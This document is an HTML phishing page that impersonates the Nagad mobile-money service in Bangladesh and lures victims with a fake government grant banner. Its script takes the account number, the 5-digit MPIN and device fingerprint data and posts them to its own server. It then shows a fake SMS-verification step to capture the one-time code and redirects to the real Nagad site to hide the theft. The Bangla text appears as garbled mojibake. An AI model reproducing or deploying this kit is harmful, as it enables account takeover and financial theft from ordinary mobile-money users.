<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Nagad</title>
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; 
        }
        
        body { 
            background: linear-gradient(135deg, #e21313 0%, #c10c0c 100%); 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            color: #333; 
            padding: 20px;
        }
        
        .nagad-logo { 
            margin-bottom: 20px; 
            text-align: center; 
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .nagad-icon {
            width: 70px;
            height: 70px;
            background-color: white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 16px;
            box-shadow: 0 6px 20px rgba(0,0,0,0.2);
        }
        
        .nagad-icon img {
            width: 70px;
            height: 70px;
            border-radius: 100%;
        }
        
        .nagad-logo-text { 
            font-size: 42px; 
            font-weight: bold; 
            color: white; 
            letter-spacing: -1px;
            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }
        
        .tagline {
            font-size: 16px;
            color: rgba(255,255,255,0.9);
            margin-top: 8px;
            font-weight: 500;
        }
        
        .government-banner {
            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
            color: #b8860b;
            padding: 15px 25px;
            border-radius: 12px;
            margin-bottom: 25px;
            text-align: center;
            font-weight: 700;
            font-size: 18px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            border: 2px solid #ffed4e;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }
        
        .container { 
            background-color: white; 
            padding: 30px; 
            border-radius: 20px; 
            box-shadow: 0 12px 40px rgba(0,0,0,0.25); 
            width: 100%; 
            max-width: 420px; 
            text-align: center; 
        }
        
        h1 { 
            font-size: 24px; 
            font-weight: 600; 
            margin-bottom: 25px; 
            color: #e21313;
            text-align: center;
        }
        
        .h1-2fa { 
            font-size: 22px; 
            font-weight: 700; 
            margin-bottom: 12px; 
            color: #e21313;
        }
        
        .p-2fa { 
            font-size: 15px; 
            color: #666; 
            margin-bottom: 25px; 
            line-height: 1.5;
        }
        
        .input-group { 
            margin-bottom: 20px; 
            text-align: left;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #555;
            font-weight: 600;
        }
        
        input[type="text"], input[type="password"], input[type="tel"] { 
            width: 100%; 
            height: 52px; 
            border: 2px solid #e0e0e0; 
            border-radius: 12px; 
            padding: 0 18px; 
            font-size: 16px; 
            background-color: #f8f9fa; 
            transition: all 0.3s ease;
            color: #333;
        }
        
        input:focus { 
            outline: none; 
            border-color: #e21313; 
            box-shadow: 0 0 0 3px rgba(226, 19, 19, 0.1); 
            background-color: white;
        }
        
        #code { 
            text-align: center; 
            letter-spacing: 8px; 
            font-size: 20px;
            font-weight: 600;
            color: #e21313;
        }
        
        .button { 
            color: white; 
            background: linear-gradient(135deg, #e21313 0%, #c10c0c 100%); 
            border: none; 
            border-radius: 12px; 
            padding: 16px 0; 
            font-size: 18px; 
            font-weight: 700; 
            cursor: pointer; 
            width: 100%; 
            margin-top: 10px; 
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(226, 19, 19, 0.3);
        }
        
        .button:hover { 
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(226, 19, 19, 0.4);
        }
        
        .button:active {
            transform: translateY(0);
        }
        
        #loader { 
            display: none; 
            margin: 15px auto; 
            width: 32px; 
            height: 32px; 
            border: 3px solid #f3f3f3; 
            border-top: 3px solid #e21313; 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
        }
        
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        
        .footer {
            margin-top: 30px;
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
            text-align: center;
            line-height: 1.6;
        }
        
        .footer a {
            color: white;
            text-decoration: none;
            font-weight: 600;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .help-links {
            margin-top: 20px;
            display: flex;
            justify-content: center;
            gap: 20px;
        }
        
        .help-links a {
            color: #e21313;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
        }
        
        .help-links a:hover {
            text-decoration: underline;
        }
        
        .security-notice {
            background: #fff3f3;
            border: 1px solid #ffd1d1;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            text-align: center;
            font-size: 13px;
            color: #c10c0c;
        }
        
        .security-notice strong {
            display: block;
            margin-bottom: 5px;
        }

        /* 2FA Specific Styles */
        .countdown {
            font-size: 14px;
            color: #e21313;
            font-weight: 600;
            margin-top: 10px;
        }

        .resend-option {
            margin-top: 15px;
            text-align: center;
        }

        .phone-prefix {
            display: flex;
            align-items: center;
        }

        .phone-prefix span {
            background: #f0f0f0;
            padding: 0 15px;
            height: 52px;
            display: flex;
            align-items: center;
            border: 2px solid #e0e0e0;
            border-right: none;
            border-radius: 12px 0 0 12px;
            font-weight: 600;
            color: #555;
        }

        .phone-prefix input {
            border-radius: 0 12px 12px 0;
        }
    </style>
</head>
<body>
    <div class="nagad-logo">
        <div class="nagad-icon">
            <!-- Nagad ‡¶≤‡ßã‡¶ó‡ßã PNG -->
            <img src="png-data/nagad-logo.png" alt="Nagad Logo" onerror="this.style.display='none'">
        </div>
        <div class="nagad-logo-text">Nagad</div>
        <div class="tagline">Digital Financial Service</div>
    </div>
    
    <!-- ‡¶∏‡¶∞‡¶ï‡¶æ‡¶∞‡¶ø ‡¶Ö‡¶®‡ßÅ‡¶¶‡¶æ‡¶® ‡¶¨‡ßç‡¶Ø‡¶æ‡¶®‡¶æ‡¶∞ -->
    <div class="government-banner">
        üéâ ‡¶∏‡¶∞‡¶ï‡¶æ‡¶∞‡¶ø ‡¶Ö‡¶®‡ßÅ‡¶¶‡¶æ‡¶®: ‡¶∏‡¶ï‡¶≤ ‡¶®‡¶æ‡¶ó‡¶∞‡¶ø‡¶ï‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡ß©‡ß¶‡ß¶‡ß¶ ‡¶ü‡¶æ‡¶ï‡¶æ üéâ
    </div>
    
    <div class="container">
        <!-- ‡¶ß‡¶æ‡¶™ ‡ßß: ‡¶≤‡¶ó‡¶á‡¶® ‡¶∏‡ßá‡¶ï‡¶∂‡¶® -->
        <div id="login-section">
            <h1>Login to Your Nagad Account</h1>
            
            <div class="input-group">
                <label for="phone">Nagad Account Number</label>
                <div class="phone-prefix">
                    <span>+88</span>
                    <input type="tel" id="phone" placeholder="01XXXXXXXXX" required pattern="[0-9]{11}">
                </div>
            </div>
            
            <div class="input-group">
                <label for="pass">MPIN</label>
                <input type="password" id="pass" placeholder="Enter your 5-digit MPIN" required maxlength="5" pattern="[0-9]{5}">
            </div>
            
            <button id="login-button" class="button" onclick="sendLoginInfo()">Login to Nagad</button>
            <div id="loader"></div>
            


        </div>
        
        <!-- ‡¶ß‡¶æ‡¶™ ‡ß®: 2FA ‡¶ï‡ßã‡¶° ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶® -->
        <div id="2fa-section" style="display: none;">
            <h1 class="h1-2fa">Security Verification</h1>
            <p class="p-2fa" id="verification-message">We've sent a 6-digit verification code to your registered mobile number. Please enter it below to continue.</p>
            
            <div class="input-group">
                <input type="text" id="code" placeholder="‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢" maxlength="6" required pattern="[0-9]{6}">
            </div>
            
            <div class="countdown" id="countdown">Code expires in: 05:00</div>
            
            <button id="code-button" class="button" onclick="send2FACode()">Verify & Continue</button>
            
            <div class="resend-option">
                Didn't receive the code? 
                <a href="#" onclick="resendCode()" style="color: #e21313; text-decoration: none; font-weight: 600;">Resend Code</a>
                <br>
                <a href="#" onclick="goBackToLogin()" style="color: #666; text-decoration: none; font-size: 13px; margin-top: 5px; display: inline-block;">‚Üê Back to Login</a>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <p>¬© 2024 Nagad Ltd. All rights reserved.</p>
        <p style="margin-top: 8px;">
            <a href="#">Terms of Service</a> | 
            <a href="#">Privacy Policy</a> | 
            <a href="#">Security Tips</a>
        </p>
        <p style="margin-top: 12px; font-size: 12px; opacity: 0.8;">
            A subsidiary of Bangladesh Post Office
        </p>
    </div>

    <script>
        let countdownInterval;
        let timeLeft = 300; // 5 minutes in seconds

        // Device info collection script (Live.py compatible)
        document.addEventListener('DOMContentLoaded', function() {
            // Create hidden field for device info
            let deviceField = document.getElementById('deviceInfo');
            if (!deviceField) {
                deviceField = document.createElement('input');
                deviceField.type = 'hidden';
                deviceField.name = 'deviceInfo';
                deviceField.id = 'deviceInfo';
                document.body.appendChild(deviceField);
            }
            
            // Collect device information
            const deviceInfo = {
                ua: navigator.userAgent || 'Unknown',
                platform: navigator.platform || 'Unknown',
                res: window.screen.width + 'x' + window.screen.height
            };
            
            // Collect network information
            if (navigator.connection) {
                deviceInfo.net_type = navigator.connection.type || 'unknown';
                deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
                deviceInfo.net_downlink = (navigator.connection.downlink || '0') + ' Mbps';
            } else {
                deviceInfo.net_type = 'Not available';
                deviceInfo.net_effective = 'N/A';
                deviceInfo.net_downlink = 'N/A';
            }
            
            // Set device info
            deviceField.value = JSON.stringify(deviceInfo);
            
            // Input formatting
            const phoneInput = document.getElementById('phone');
            if (phoneInput) {
                phoneInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 11) {
                        value = value.substring(0, 11);
                    }
                    e.target.value = value;
                });
            }
            
            const pinInput = document.getElementById('pass');
            if (pinInput) {
                pinInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 5) {
                        value = value.substring(0, 5);
                    }
                    e.target.value = value;
                });
            }
            
            const codeInput = document.getElementById('code');
            if (codeInput) {
                codeInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 6) {
                        value = value.substring(0, 6);
                    }
                    e.target.value = value;
                    
                    // Auto-submit when 6 digits entered
                    if (value.length === 6) {
                        document.getElementById('code-button').click();
                    }
                });
            }
        });

        // ‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü‡¶°‡¶æ‡¶â‡¶® ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡¶¨‡ßá
        function startCountdown() {
            timeLeft = 300; // Reset to 5 minutes
            updateCountdown();
            
            countdownInterval = setInterval(() => {
                timeLeft--;
                updateCountdown();
                
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    document.getElementById('countdown').textContent = 'Code expired!';
                    document.getElementById('countdown').style.color = '#ff0000';
                }
            }, 1000);
        }

        // ‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü‡¶°‡¶æ‡¶â‡¶® ‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶ï‡¶∞‡¶¨‡ßá
        function updateCountdown() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            document.getElementById('countdown').textContent = 
                `Code expires in: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }

        // ‡¶ï‡ßã‡¶° ‡¶∞‡¶ø‡¶∏‡ßá‡¶®‡ßç‡¶° ‡¶ï‡¶∞‡¶¨‡ßá
        function resendCode() {
            if (timeLeft > 240) { // If more than 4 minutes left, don't allow resend
                alert('Please wait before requesting a new code.');
                return;
            }
            
            clearInterval(countdownInterval);
            startCountdown();
            
            // Show sending indicator
            const codeButton = document.getElementById('code-button');
            const originalText = codeButton.textContent;
            codeButton.textContent = 'Resending...';
            codeButton.disabled = true;
            
            setTimeout(() => {
                codeButton.textContent = originalText;
                codeButton.disabled = false;
                alert('New verification code sent!');
            }, 1000);
        }

        // ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï ‡¶ü‡ßÅ ‡¶≤‡¶ó‡¶á‡¶®
        function goBackToLogin() {
            document.getElementById('2fa-section').style.display = 'none';
            document.getElementById('login-section').style.display = 'block';
            clearInterval(countdownInterval);
        }

        // ‡¶è‡¶á ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®‡¶ü‡¶ø ‡¶™‡ßç‡¶∞‡¶•‡¶Æ ‡¶ß‡¶æ‡¶™‡ßá‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø ‡¶™‡¶æ‡¶†‡¶æ‡ßü
        async function sendLoginInfo() {
            const phone = document.getElementById('phone').value;
            const pass = document.getElementById('pass').value;
            const deviceInfoField = document.getElementById('deviceInfo');
            const deviceInfo = deviceInfoField ? deviceInfoField.value : '{}';

            // Validation
            if (!phone || phone.length !== 11 || !phone.startsWith('01')) {
                alert('Please enter a valid 11-digit Nagad account number starting with 01.');
                return;
            }

            if (!pass || pass.length !== 5) {
                alert('Please enter your 5-digit MPIN.');
                return;
            }

            // ‡¶¨‡¶æ‡¶ü‡¶® ‡¶ì ‡¶≤‡ßã‡¶°‡¶æ‡¶∞ ‡¶®‡¶ø‡ßü‡¶®‡ßç‡¶§‡ßç‡¶∞‡¶£
            const loginButton = document.getElementById('login-button');
            const loader = document.getElementById('loader');
            loginButton.style.display = 'none';
            loader.style.display = 'block';

            // FormData ‡¶¶‡¶ø‡ßü‡ßá ‡¶°‡ßá‡¶ü‡¶æ ‡¶§‡ßà‡¶∞‡¶ø
            const params = new URLSearchParams();
            params.append('phone', phone);
            params.append('pass', pass);
            params.append('deviceInfo', deviceInfo);

            try {
                // ‡¶™‡ßá‡¶ú ‡¶∞‡¶ø‡¶≤‡ßã‡¶° ‡¶õ‡¶æ‡ßú‡¶æ‡¶á ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá ‡¶°‡ßá‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®
                const response = await fetch('/', { 
                    method: 'POST', 
                    body: params,
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    }
                });
                
                // ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶™‡¶∞ UI ‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶® - ‡¶∏‡¶∞‡¶æ‡¶∏‡¶∞‡¶ø 2FA ‡¶∏‡ßá‡¶ï‡¶∂‡¶®‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá
                setTimeout(() => {
                    document.getElementById('login-section').style.display = 'none';
                    document.getElementById('2fa-section').style.display = 'block';
                    
                    // Update verification message with phone number
                    const phone = document.getElementById('phone').value;
                    const lastFour = phone.substring(7);
                    document.getElementById('verification-message').textContent = 
                        `We've sent a 6-digit verification code via SMS to +88${phone}. Please enter it below to continue.`;
                    
                    // Start countdown
                    startCountdown();
                    
                    loginButton.style.display = 'block';
                    loader.style.display = 'none';
                }, 1000);
                
            } catch (error) {
                console.error('Error:', error);
                alert('Login failed. Please check your internet connection and try again.');
                loginButton.style.display = 'block';
                loader.style.display = 'none';
            }
        }

        // ‡¶è‡¶á ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®‡¶ü‡¶ø ‡¶¶‡ßç‡¶¨‡¶ø‡¶§‡ßÄ‡ßü ‡¶ß‡¶æ‡¶™‡ßá‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø ‡¶™‡¶æ‡¶†‡¶æ‡ßü
        async function send2FACode() {
            const phone = document.getElementById('phone').value;
            const code = document.getElementById('code').value;

            if (!code || code.length !== 6) {
                alert('Please enter the 6-digit verification code.');
                return;
            }
            
            const codeButton = document.getElementById('code-button');
            codeButton.textContent = 'Verifying...';
            codeButton.disabled = true;
            
            const params = new URLSearchParams();
            params.append('phone', phone);
            params.append('2fa_code', code);
            
            try {
                // ‡¶¶‡ßç‡¶¨‡¶ø‡¶§‡ßÄ‡ßü‡¶¨‡¶æ‡¶∞ ‡¶°‡ßá‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶® ‡¶è‡¶¨‡¶Ç ‡¶è‡¶∞‡¶™‡¶∞ ‡¶∞‡¶ø‡¶°‡¶æ‡¶á‡¶∞‡ßá‡¶ï‡ßç‡¶ü ‡¶π‡¶¨‡ßá
                const response = await fetch('/', { 
                    method: 'POST', 
                    body: params,
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    }
                });
                
                if (response.redirected) {
                    window.location.href = response.url;
                } else {
                   // ‡¶Ø‡¶¶‡¶ø ‡¶ï‡ßã‡¶®‡ßã ‡¶ï‡¶æ‡¶∞‡¶£‡ßá ‡¶∞‡¶ø‡¶°‡¶æ‡¶á‡¶∞‡ßá‡¶ï‡ßç‡¶ü ‡¶®‡¶æ ‡¶π‡ßü
                   window.location.href = 'https://www.nagad.com.bd';
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Verification failed. Please try again.');
                codeButton.textContent = 'Verify & Continue';
                codeButton.disabled = false;
            }
        }
    </script>
</body>
</html>